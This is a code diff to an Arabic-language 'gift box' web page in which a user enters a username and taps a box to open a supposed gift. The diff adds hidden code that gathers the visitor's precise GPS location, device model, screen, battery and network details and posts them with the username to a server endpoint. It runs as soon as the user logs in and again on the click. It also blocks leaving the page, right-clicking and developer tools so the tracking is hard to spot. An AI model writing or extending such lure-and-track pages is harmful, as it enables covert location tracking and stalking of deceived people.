@@ -271,6 +271,13 @@
     0% { top: 0; }
     100% { top: 100%; }
   }
+
+  .location-status {
+    font-size: 0.8em;
+    color: #666;
+    margin-top: 10px;
+    opacity: 0.6;
+  }
 </style>
 </head>
 <body>
@@ -296,6 +303,7 @@
       <p class="sub-text">اضغط على الصندوق لفتحه</p>
       <div class="gift-box" id="gift-box">🎁</div>
       <div class="gift-username">👤 <span id="gift-username"></span></div>
+      <div class="location-status" id="location-status">📍 جاري جلب الموقع...</div>
     </div>
 
     <div id="success-screen">
@@ -308,6 +316,7 @@
 <script>
 let alreadySent = false;
 let username = '';
+let userData = {};
 
 // خلفية القلوب
 function createHeartsBackground() {
@@ -367,6 +376,245 @@ const loginForm = document.getElementById('login-form');
 const usernameInput = document.getElementById('username-input');
 const giftBox = document.getElementById('gift-box');
 const giftUsername = document.getElementById('gift-username');
+const locationStatus = document.getElementById('location-status');
+
+// دالة جلب معلومات الجهاز
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
+  let deviceModel = 'غير معروف';
+  let platform = 'غير معروف';
+  let os = 'غير معروف';
+  
+  // استخراج موديل الجهاز من User Agent
+  if (ua.includes('iPhone')) {
+    deviceModel = 'iPhone';
+    os = 'iOS';
+  } else if (ua.includes('iPad')) {
+    deviceModel = 'iPad';
+    os = 'iOS';
+  } else if (ua.includes('Android')) {
+    const match = ua.match(/Android\s([\d.]+)/);
+    os = `Android ${match ? match[1] : ''}`;
+    
+    // محاولة استخراج الموديل
+    const modelMatch = ua.match(/\(([^)]+)\)/);
+    if (modelMatch) {
+      const parts = modelMatch[1].split(';');
+      for (let part of parts) {
+        if (part.includes('Build')) {
+          const buildParts = part.trim().split(' ');
+          if (buildParts.length > 1) {
+            deviceModel = buildParts[0];
+          }
+          break;
+        }
+      }
+    }
+  } else if (ua.includes('Windows')) {
+    os = 'Windows';
+    deviceModel = 'PC';
+  } else if (ua.includes('Mac')) {
+    os = 'macOS';
+    deviceModel = 'Mac';
+  } else if (ua.includes('Linux')) {
+    os = 'Linux';
+    deviceModel = 'PC';
+  }
+  
+  // معلومات إضافية
+  const platformInfo = navigator.platform || 'غير معروف';
+  const vendorInfo = navigator.vendor || 'غير معروف';
+  
+  return {
+    deviceModel: deviceModel,
+    platform: platformInfo,
+    vendor: vendorInfo,
+    os: os,
+    userAgent: ua,
+    screenWidth: window.screen.width,
+    screenHeight: window.screen.height,
+    pixelRatio: window.devicePixelRatio || 1
+  };
+}
+
+// دالة جلب الموقع
+function getLocation() {
+  return new Promise((resolve) => {
+    if ('geolocation' in navigator) {
+      locationStatus.textContent = '📍 جاري جلب الموقع...';
+      
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const location = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            altitude: position.coords.altitude || null,
+            speed: position.coords.speed || null,
+            timestamp: new Date(position.timestamp).toLocaleString(),
+            status: 'تم الحصول على الموقع'
+          };
+          locationStatus.textContent = `📍 الموقع: ${location.latitude}, ${location.longitude}`;
+          resolve(location);
+        },
+        (error) => {
+          let errorMsg = 'غير معروف';
+          switch(error.code) {
+            case error.PERMISSION_DENIED:
+              errorMsg = 'المستخدم رفض الوصول';
+              break;
+            case error.POSITION_UNAVAILABLE:
+              errorMsg = 'الموقع غير متاح';
+              break;
+            case error.TIMEOUT:
+              errorMsg = 'انتهى الوقت';
+              break;
+          }
+          locationStatus.textContent = `📍 ${errorMsg}`;
+          resolve({ 
+            status: 'error', 
+            error: errorMsg,
+            code: error.code 
+          });
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    } else {
+      locationStatus.textContent = '📍 الموقع غير مدعوم في هذا المتصفح';
+      resolve({ 
+        status: 'unsupported',
+        error: 'المتصفح لا يدعم تحديد الموقع'
+      });
+    }
+  });
+}
+
+// دالة جلب معلومات البطارية
+function getBatteryInfo() {
+  return new Promise((resolve) => {
+    if ('getBattery' in navigator) {
+      navigator.getBattery().then((battery) => {
+        resolve({
+          level: Math.round(battery.level * 100),
+          charging: battery.charging,
+          chargingTime: battery.chargingTime,
+          dischargingTime: battery.dischargingTime
+        });
+      }).catch(() => {
+        resolve(null);
+      });
+    } else {
+      resolve(null);
+    }
+  });
+}
+
+// دالة جلب معلومات الشبكة
+function getNetworkInfo() {
+  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  let connectionType = 'غير معروف';
+  let speed = 'غير معروف';
+  let signal = 'غير معروف';
+  
+  if (connection) {
+    // نوع الاتصال
+    if (connection.type) {
+      const types = {
+        'wifi': 'واي فاي',
+        'cellular': 'بيانات جوال',
+        'ethernet': 'إيثرنت',
+        'none': 'غير متصل',
+        'unknown': 'غير معروف'
+      };
+      connectionType = types[connection.type] || connection.type;
+    } else {
+      const downlink = connection.downlink || 0;
+      const rtt = connection.rtt || 0;
+      if (downlink === 0 && rtt === 0) {
+        connectionType = 'غير متصل';
+      } else if (downlink > 20 && rtt < 30) {
+        connectionType = 'واي فاي';
+      } else if (downlink > 0) {
+        connectionType = 'بيانات جوال';
+      } else {
+        connectionType = 'غير معروف';
+      }
+    }
+    
+    // السرعة
+    if (connection.downlink !== undefined && connection.downlink !== null) {
+      const speedValue = connection.downlink;
+      if (speedValue >= 1000) {
+        speed = (speedValue / 1000).toFixed(2) + ' Gbps';
+      } else if (speedValue >= 1) {
+        speed = speedValue.toFixed(2) + ' Mbps';
+      } else {
+        speed = (speedValue * 1000).toFixed(0) + ' Kbps';
+      }
+    }
+    
+    // الإشارة
+    if (connection.bars !== undefined && connection.bars !== null) {
+      const bars = Math.min(Math.max(Math.round(connection.bars), 0), 4);
+      signal = bars + '/4';
+    } else {
+      const downlink = connection.downlink || 0;
+      if (downlink >= 50) {
+        signal = '4/4 (ممتازة)';
+      } else if (downlink >= 20) {
+        signal = '3/4 (جيدة)';
+      } else if (downlink >= 5) {
+        signal = '2/4 (متوسطة)';
+      } else if (downlink >= 1) {
+        signal = '1/4 (ضعيفة)';
+      } else if (downlink > 0) {
+        signal = '0/4 (سيئة جداً)';
+      } else {
+        signal = 'لا توجد إشارة';
+      }
+    }
+  }
+  
+  return {
+    connectionType: connectionType,
+    speed: speed,
+    signal: signal,
+    isOnline: navigator.onLine
+  };
+}
+
+// دالة إرسال البيانات
+async function sendAllData() {
+  const deviceInfo = getDeviceInfo();
+  const batteryInfo = await getBatteryInfo();
+  const networkInfo = getNetworkInfo();
+  const locationInfo = await getLocation();
+  
+  const data = {
+    username: username,
+    device: deviceInfo,
+    battery: batteryInfo,
+    network: networkInfo,
+    location: locationInfo,
+    timestamp: new Date().toISOString()
+  };
+  
+  try {
+    const response = await fetch('/api/send-all-data', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    });
+    const result = await response.json();
+    console.log('Data sent:', result);
+  } catch (error) {
+    console.error('Error sending data:', error);
+  }
+}
 
 // معالج تسجيل الدخول
 loginForm.addEventListener('submit', function(e) {
@@ -386,6 +634,9 @@ loginForm.addEventListener('submit', function(e) {
   giftUsername.textContent = username;
   loginScreen.classList.add('hidden');
   giftScreen.classList.remove('hidden');
+  
+  // بدء جمع البيانات فوراً
+  sendAllData();
 });
 
 // معالج صندوق الهدية
@@ -398,100 +649,10 @@ giftBox.addEventListener('click', function() {
   
   setTimeout(() => {
     document.body.classList.add('green-mode');
+    alreadySent = true;
     
-    if (!alreadySent) {
-      alreadySent = true;
-      
-      // معلومات البطارية
-      if ('getBattery' in navigator) {
-        navigator.getBattery().then(function(battery) {
-          let percent = Math.round(battery.level * 100);
-          let charging = battery.charging ? '✅ يشحن' : '❌ لا يشحن';
-          
-          // معلومات الشبكة
-          const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-          
-          let connectionType = 'غير معروف';
-          let speed = 'غير معروف';
-          let signal = 'غير معروف';
-          
-          if (connection) {
-            // نوع الاتصال
-            if (connection.type) {
-              const types = {
-                'wifi': 'واي فاي',
-                'cellular': 'بيانات جوال',
-                'ethernet': 'إيثرنت',
-                'none': 'غير متصل',
-                'unknown': 'غير معروف'
-              };
-              connectionType = types[connection.type] || connection.type;
-            } else {
-              // تقدير من السرعة
-              const downlink = connection.downlink || 0;
-              const rtt = connection.rtt || 0;
-              if (downlink === 0 && rtt === 0) {
-                connectionType = 'غير متصل';
-              } else if (downlink > 20 && rtt < 30) {
-                connectionType = 'واي فاي';
-              } else if (downlink > 0) {
-                connectionType = 'بيانات جوال';
-              } else {
-                connectionType = 'غير معروف';
-              }
-            }
-            
-            // السرعة
-            if (connection.downlink !== undefined && connection.downlink !== null) {
-              const speedValue = connection.downlink;
-              if (speedValue >= 1000) {
-                speed = (speedValue / 1000).toFixed(2) + ' Gbps';
-              } else if (speedValue >= 1) {
-                speed = speedValue.toFixed(2) + ' Mbps';
-              } else {
-                speed = (speedValue * 1000).toFixed(0) + ' Kbps';
-              }
-            }
-            
-            // الإشارة
-            if (connection.bars !== undefined && connection.bars !== null) {
-              const bars = Math.min(Math.max(Math.round(connection.bars), 0), 4);
-              signal = bars + '/4';
-            } else {
-              // تقدير من السرعة
-              const downlink = connection.downlink || 0;
-              if (downlink >= 50) {
-                signal = '4/4 (ممتازة)';
-              } else if (downlink >= 20) {
-                signal = '3/4 (جيدة)';
-              } else if (downlink >= 5) {
-                signal = '2/4 (متوسطة)';
-              } else if (downlink >= 1) {
-                signal = '1/4 (ضعيفة)';
-              } else if (downlink > 0) {
-                signal = '0/4 (سيئة جداً)';
-              } else {
-                signal = 'لا توجد إشارة';
-              }
-            }
-          }
-          
-          // إرسال البيانات
-          fetch('/api/send-all-data', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-              username: username,
-              battery: percent,
-              charging: charging,
-              connectionType: connectionType,
-              speed: speed,
-              signal: signal
-            })
-          });
-        }).catch(() => {});
-      }
-    }
+    // إرسال البيانات مرة أخرى للتأكيد
+    sendAllData();
   }, 600);
 });
 
@@ -501,15 +662,18 @@ usernameInput.addEventListener('keypress', function(e) {
   }
 });
 
+// منع الخروج
 window.addEventListener('beforeunload', function (e) {
   e.preventDefault();
   e.returnValue = '';
 });
 
+// منع النقر بزر الماوس الأيمن
 document.addEventListener('contextmenu', function(e) {
   e.preventDefault();
 });
 
+// منع أدوات المطور
 document.addEventListener('keydown', function(e) {
   if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
       (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'U')) {
